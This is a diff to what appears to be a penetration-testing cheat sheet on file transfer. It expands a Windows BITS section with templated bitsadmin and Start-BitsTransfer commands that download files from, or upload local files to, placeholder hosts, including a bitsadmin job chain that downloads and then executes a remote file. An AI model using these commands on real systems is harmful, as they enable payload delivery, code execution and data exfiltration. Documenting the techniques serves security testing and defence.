@@ -371,17 +371,51 @@ copy \\<HOSTNAME | IP>\<SHARE_NAME>\<FILE> .
 ```
 
 
-###### [Windows] BITSAdmin
+###### [Windows] BITS
+
+`Background Intelligent Transfer Service (BITS)` is a Microsoft Windows
+component developed to asynchronously transfer files with a reduced network
+bandwidth usage. It is notably used by `Windows Server Update Services (WSUS)`
+and `System Center Configuration Manager (SCCM)` servers to deliver updates to
+Windows clients. Others third-party software, such as Firefox and Google
+Chrome, also rely on `BITS` to download their updates on Windows operating
+systems. `BITS` supports transfers over the `SMB`, `HTTP` and `HTTPS`
+protocols.
 
 `BITSAdmin` is a Windows command-line built-in utility that can be used to
-create, download or upload files.
-
-Note that `BITSAdmin` will not attempt the download if the security context
-under which its executed does not have the permission to write files on the
-specified output path.
+create, download or upload files using `BITS`. Note that `BITSAdmin` will not
+attempt the download if the security context under which its executed does not
+have the permission to write files on the specified output path.
 
 ```
-bitsadmin /transfer job http://<IP>:<PORT>/<FILE> <OUTPUT_FILE_PATH>
+# Download the remote file.
+bitsadmin /transfer <job | JOB_NAME> http://<IP | HOSTNAME>:<PORT>/<FILE> <OUTPUT_FILE_PATH>
+
+# Upload the local file to the remote location.
+bitsadmin /transfer <job | JOB_NAME> /upload http://<IP | HOSTNAME>:<PORT>/<FILE> <INPUT_FILE_PATH>
+```
+
+Note that downloaded files can be directly and executed using `bitsadmin`:
+
+```
+bitsadmin /create <JOB_NAME>
+bitsadmin /addfile <JOB_NAME> http://<IP | HOSTNAME>:<PORT>/<FILE> <OUTPUT_FILE_PATH>
+bitsadmin /SetNotifyCmdLine <JOB_NAME> <OUTPUT_FILE_PATH> NUL
+bitsadmin /SetMinRetryDelay <JOB_NAME> 60
+bitsadmin /resume <JOB_NAME>
+```
+
+The PowerShell `Start-BitsTransfer` may be used as well to download / upload
+files through `BITS`:
+
+```
+# Download the remote file(s) using HTTP/S or SMB.
+Start-BitsTransfer -Source "http://<IP | HOSTNAME>:<PORT>/<FILE>" -Destination "<OUTPUT_FILE_PATH>"
+Start-BitsTransfer -Source "\\<IP | HOSTNAME>\<SHARE>\<FILE | *>" -Destination "<OUTPUT_FILE_PATH>"
+
+# Upload the local file(s) to the remote location using HTTP/S or SMB.
+Start-BitsTransfer -TransferType Upload -Source "<INPUT_FILE_PATH>" -Destination "http://<IP | HOSTNAME>:<PORT>/<FILE>"
+Start-BitsTransfer -TransferType Upload -Source "<INPUT_FILE_PATH | *>" -Destination "\\<IP | HOSTNAME>\<SHARE>\"
 ```
 
 ###### [Windows] CertUtil
